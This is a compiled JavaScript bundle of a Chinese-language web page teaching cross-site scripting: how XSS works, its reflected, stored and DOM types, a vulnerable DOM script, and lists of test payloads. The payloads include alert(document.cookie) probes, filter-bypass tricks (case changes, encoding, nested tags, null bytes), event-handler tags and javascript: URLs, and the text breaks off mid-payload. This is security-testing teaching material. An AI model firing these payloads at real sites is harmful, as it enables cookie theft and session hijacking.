(window.__LOADABLE_LOADED_CHUNKS__=window.__LOADABLE_LOADED_CHUNKS__||[]).push([[24],{154:function(e,a,t){"use strict";t.r(a),t.d(a,"default",(function(){return b}));t(130),t(0);var n=t(93);function c(){return(c=Object.assign||function(e){for(var a=1;a<arguments.length;a++){var t=arguments[a];for(var n in t)Object.prototype.hasOwnProperty.call(t,n)&&(e[n]=t[n])}return e}).apply(this,arguments)}function s(e,a){if(null==e)return{};var t,n,c=function(e,a){if(null==e)return{};var t,n,c={},s=Object.keys(e);for(n=0;n<s.length;n++)t=s[n],a.indexOf(t)>=0||(c[t]=e[t]);return c}(e,a);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(e);for(n=0;n<s.length;n++)t=s[n],a.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(c[t]=e[t])}return c}var o={},p="wrapper";function b(e){var a=e.components,t=s(e,["components"]);return Object(n.b)(p,c({},o,t,{components:a,mdxType:"MDXLayout"}),Object(n.b)("h1",{className:"__internal",id:"xss跨站脚本漏洞"},"XSS跨站脚本漏洞",Object(n.b)("a",c({parentName:"h1"},{href:"#xss%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%BC%8F%E6%B4%9E","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("h2",{className:"__internal",id:"xss跨站原理"},"XSS跨站原理",Object(n.b)("a",c({parentName:"h2"},{href:"#xss%E8%B7%A8%E7%AB%99%E5%8E%9F%E7%90%86","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("blockquote",null,Object(n.b)("p",{parentName:"blockquote"},"当应用程序发送给浏览器的页面中包含用户提交的数据，但没有经过适当验证或转义时，就会导致跨站脚本漏洞"),Object(n.b)("p",{parentName:"blockquote"},"这个“跨”实际上属于浏览器的特性，而不是缺陷;"),Object(n.b)("p",{parentName:"blockquote"},"浏览器同源策略：只有发布Cookie的网站才能读取Cookie。"),Object(n.b)("p",{parentName:"blockquote"},"会造成Cookie窃取、劫持用户Web行为、结合CSRF进行针对性攻击等危害")),Object(n.b)("h2",{className:"__internal",id:"分类"},"分类",Object(n.b)("a",c({parentName:"h2"},{href:"#%E5%88%86%E7%B1%BB","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("h4",{className:"__internal",id:"反射型"},"反射型",Object(n.b)("a",c({parentName:"h4"},{href:"#%E5%8F%8D%E5%B0%84%E5%9E%8B","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,"出现在搜索栏，用户登录等地方，常用来窃取客户端的Cookie进行钓鱼欺骗。(需要用户去点击)"),Object(n.b)("p",null,"想要窃取cookie要满足两个条件："),Object(n.b)("blockquote",null,Object(n.b)("p",{parentName:"blockquote"},"1.用户点击攻击者构造的URL"),Object(n.b)("p",{parentName:"blockquote"},"2.访问被攻击的应用服务(即存在xss的网站)")),Object(n.b)("h4",{className:"__internal",id:"存储型"},"存储型",Object(n.b)("a",c({parentName:"h4"},{href:"#%E5%AD%98%E5%82%A8%E5%9E%8B","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,"出现在留言、评论、博客日志等交互处，直接影响Web服务器自身安全"),Object(n.b)("h4",{className:"__internal",id:"dom型"},"DOM型",Object(n.b)("a",c({parentName:"h4"},{href:"#dom%E5%9E%8B","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("blockquote",null,Object(n.b)("p",{parentName:"blockquote"},"基于文档对象模型(Document Object Model)的一种漏洞；"),Object(n.b)("p",{parentName:"blockquote"},"DOM型与反射型类似，都需要攻击者诱使用户点击专门设计的URL；"),Object(n.b)("p",{parentName:"blockquote"},"Dom型xss是通过url传入参数去控制触发的；"),Object(n.b)("p",{parentName:"blockquote"},"Dom型返回页面源码中看不到输入的payload， 而是保存在浏览器的DOM中。")),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"假设应用程序返回的页面包含以下脚本：")),Object(n.b)("div",{className:"rcpress-highlight","data-language":"javascript"},Object(n.b)("pre",c({parentName:"div"},{className:"language-javascript"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-javascript"}),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),"script",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),"\n    ",Object(n.b)("span",c({parentName:"code"},{className:"token keyword"}),"var")," url ",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"=")," document",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),"location",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),"\n    url ",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"=")," ",Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"unescape"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),"url",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),"\n    ",Object(n.b)("span",c({parentName:"code"},{className:"token keyword"}),"var")," message ",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"=")," url",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"substring"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),"url",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"indexOf"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token string"}),"'message='"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")," ",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"+")," ",Object(n.b)("span",c({parentName:"code"},{className:"token number"}),"8"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),","),"url",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),"length",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),"\n    document",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"write"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),"message",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),"\n",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"/"),"script",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">")))),Object(n.b)("p",null,"把javascript代码作为message的参数，这段代码将会被动态的写入到页面中，"),Object(n.b)("p",null,"并像服务器返回代码一样得以执行。"),Object(n.b)("p",null,"DOM型与反射 型类似，都需要攻击者诱使用户点击专门设计的URL"),Object(n.b)("p",null,"推荐阅读： ",Object(n.b)("a",c({parentName:"p"},{href:"https://xz.aliyun.com/t/3919",target:"_blank"}),"记一次从DOM型XSS到RCE过程")),Object(n.b)("h1",{className:"__internal",id:"查找利用xss漏洞"},"查找利用XSS漏洞",Object(n.b)("a",c({parentName:"h1"},{href:"#%E6%9F%A5%E6%89%BE%E5%88%A9%E7%94%A8xss%E6%BC%8F%E6%B4%9E","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("h2",{className:"__internal",id:"基本验证"},"基本验证",Object(n.b)("a",c({parentName:"h2"},{href:"#%E5%9F%BA%E6%9C%AC%E9%AA%8C%E8%AF%81","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("div",{className:"rcpress-highlight","data-language":"javascript"},Object(n.b)("pre",c({parentName:"div"},{className:"language-javascript"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-javascript"}),'"',Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),"script",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"alert"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),"document",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),"cookie",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"/"),"script",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">")))),Object(n.b)("p",null,"把这个字符串提交给每个应用程序页面的每个参数；"),Object(n.b)("p",null,"同时监控它的响应，如果攻击字符串原样出现在响应中，就可能存在XSS漏洞。"),Object(n.b)("p",null,"许多应用可能会经过黑名单等简单的初步过滤，试图阻止XSS攻击；"),Object(n.b)("p",null,"可以通过编码等方式绕过："),Object(n.b)("div",{className:"rcpress-highlight","data-language":"javascript"},Object(n.b)("pre",c({parentName:"div"},{className:"language-javascript"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-javascript"}),'"',Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),"ScRiPt",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"alert"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),"document",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),"cookie",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"/"),"ScRiPt",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),'\n"',Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"%"),Object(n.b)("span",c({parentName:"code"},{className:"token number"}),"3"),"e",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"%"),Object(n.b)("span",c({parentName:"code"},{className:"token number"}),"3"),"cscript",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"%"),Object(n.b)("span",c({parentName:"code"},{className:"token number"}),"3"),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"ealert"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),"document",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),"cookie",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"%"),Object(n.b)("span",c({parentName:"code"},{className:"token number"}),"3"),"c",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"/"),"script",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"%"),Object(n.b)("span",c({parentName:"code"},{className:"token number"}),"3"),'e\n"',Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),"scr",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),"script",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),"ipt",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"alert"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),"document",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),"cookie",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"/"),"scr",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"/"),"script",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),"ipt",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),"\n",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"%"),Object(n.b)("span",c({parentName:"code"},{className:"token number"}),"00"),'"',Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),"script",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"alert"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),"document",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),"cookie",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"/"),"script",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">")))),Object(n.b)("p",null,"当利用基于DOM的XSS漏洞时，攻击有效载荷并不在服务器的响应中返回，而是保存在浏览器的DOM中，并可被客户端javascript访问。"),Object(n.b)("p",null,"在这种情况下，以上基本验证无法发现XSS漏洞。"),Object(n.b)("h2",{className:"__internal",id:"查找反射型xss"},"查找反射型XSS",Object(n.b)("a",c({parentName:"h2"},{href:"#%E6%9F%A5%E6%89%BE%E5%8F%8D%E5%B0%84%E5%9E%8Bxss","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("h4",{className:"__internal",id:"测试引入脚本的反射"},"测试引入脚本的反射",Object(n.b)("a",c({parentName:"h4"},{href:"#%E6%B5%8B%E8%AF%95%E5%BC%95%E5%85%A5%E8%84%9A%E6%9C%AC%E7%9A%84%E5%8F%8D%E5%B0%84","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"例1"),"，标签属性值："),Object(n.b)("p",null,"假设返回页面中包含以下脚本："),Object(n.b)("div",{className:"rcpress-highlight","data-language":"javascript"},Object(n.b)("pre",c({parentName:"div"},{className:"language-javascript"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-javascript"}),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),"input type",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",c({parentName:"code"},{className:"token string"}),'"text"')," name",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",c({parentName:"code"},{className:"token string"}),'"name"')," value",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",c({parentName:"code"},{className:"token string"}),'"test-text"')," ",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">")))),Object(n.b)("p",null,"很明显，利用xss的方法是终止包含字符串的双引号，结束``标签"),Object(n.b)("div",{className:"rcpress-highlight","data-language":"javascript"},Object(n.b)("pre",c({parentName:"div"},{className:"language-javascript"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-javascript"}),'"',Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),"script",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"alert"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token number"}),"1"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"/"),"script",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">")))),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"例2"),"，javascript字符串："),Object(n.b)("p",null,"假设返回页面中包含以下脚本："),Object(n.b)("div",{className:"rcpress-highlight","data-language":"javascript"},Object(n.b)("pre",c({parentName:"div"},{className:"language-javascript"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-javascript"}),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),"script",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),Object(n.b)("span",c({parentName:"code"},{className:"token keyword"}),"var")," a",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",c({parentName:"code"},{className:"token string"}),"'test-text'"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),";")," ",Object(n.b)("span",c({parentName:"code"},{className:"token keyword"}),"var")," b",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",c({parentName:"code"},{className:"token number"}),"123"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"..."),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"/"),"script",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">")))),Object(n.b)("p",null,"用分号终止语句"),Object(n.b)("div",{className:"rcpress-highlight","data-language":"javascript"},Object(n.b)("pre",c({parentName:"div"},{className:"language-javascript"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-javascript"}),Object(n.b)("span",c({parentName:"code"},{className:"token string"}),"'; alert(1); var foo='")))),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"例3"),"，包含URL的特性"),Object(n.b)("p",null,"假设返回页面中包含以下脚本："),Object(n.b)("div",{className:"rcpress-highlight","data-language":"javascript"},Object(n.b)("pre",c({parentName:"div"},{className:"language-javascript"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-javascript"}),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),"a href",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",c({parentName:"code"},{className:"token string"}),'"test-text"'),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),"Click here",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"/"),"a",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),"html"))),Object(n.b)("p",null,"这时，受控制的字符插入到一个`",Object(n.b)("inlineCode",{parentName:"p"},"标签的"),"href`属性中。"),Object(n.b)("p",null,"这个属性可能包含一个使用",Object(n.b)("inlineCode",{parentName:"p"},"javascript:"),"协议的URL，利用："),Object(n.b)("div",{className:"rcpress-highlight","data-language":"javascript"},Object(n.b)("pre",c({parentName:"div"},{className:"language-javascript"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-javascript"}),"javascript",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),":"),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"alert"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token number"}),"1"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),";")))),Object(n.b)("h4",{className:"__internal",id:"脚本标签"},"脚本标签",Object(n.b)("a",c({parentName:"h4"},{href:"#%E8%84%9A%E6%9C%AC%E6%A0%87%E7%AD%BE","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"事件处理器")),Object(n.b)("p",null,"有大量事件处理器可与各种标签结合使用，用于执行脚本。"),Object(n.b)("p",null,"一些示例，可在不需要任何用户交互的情况下执行脚本："),Object(n.b)("div",{className:"rcpress-highlight","data-language":"javascript"},Object(n.b)("pre",c({parentName:"div"},{className:"language-javascript"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-javascript"}),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),"style onreadystatechange",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"alert"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token number"}),"1"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"/"),"style",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),"\n",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),"iframe onreadystatechange",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"alert"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token number"}),"1"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"/"),"iframe",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),"\n",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),"object onerror",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"alert"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token number"}),"1"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"/"),"object",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),"\n",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),"img type",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),"image src",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),"valid",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),"gif onreadystatechange",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"alert"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token number"}),"1"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),"\n",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),"input type",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),"image src",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),"valid",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),"gif onreadystatechange",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"alert"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token number"}),"1"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),"\n",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),"body onbeforeactivate",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"alert"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token number"}),"1"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"/"),"body",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),"\n",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),"video src",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",c({parentName:"code"},{className:"token number"}),"1")," onerror",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"alert"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token number"}),"1"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"/"),"video",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),"\n",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),"audio src",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",c({parentName:"code"},{className:"token number"}),"1")," onerror",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"alert"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token number"}),"1"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">")))),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"脚本伪协议")),Object(n.b)("p",null,"脚本伪协议可用在任何位置，以在需要URL的属性中执行行内脚本。"),Object(n.b)("div",{className:"rcpress-highlight","data-language":"javascript"},Object(n.b)("pre",c({parentName:"div"},{className:"language-javascript"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-javascript"}),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),"object data",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),"javascript",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),":"),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"alert"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token number"}),"1"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"/"),"object",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),"\n",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),"iframe src",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),"javascript",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),":"),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"alert"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token number"}),"1"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"/"),"iframe",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),"\n",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),"event",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"-"),"source src",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),"javascript",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),":"),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"alert"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token number"}),"1"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"/"),"event",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"-"),"source",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">")))),Object(n.b)("h4",{className:"__internal",id:"避开过滤html"},"避开过滤:HTML",Object(n.b)("a",c({parentName:"h4"},{href:"#%E9%81%BF%E5%BC%80%E8%BF%87%E6%BB%A4html","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"标签名称")),Object(n.b)("p",null,"改变字符大小写"),Object(n.b)("div",{className:"rcpress-highlight","data-language":"javascript"},Object(n.b)("pre",c({parentName:"div"},{className:"language-javascript"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-javascript"}),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),"iMg onerror",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"alert"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token number"}),"1"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")," src",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),"a",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">")))),Object(n.b)("p",null,"插入NULL字节"),Object(n.b)("div",{className:"rcpress-highlight","data-language":"javascript"},Object(n.b)("pre",c({parentName:"div"},{className:"language-javascript"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-javascript"}),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"["),Object(n.b)("span",c({parentName:"code"},{className:"token 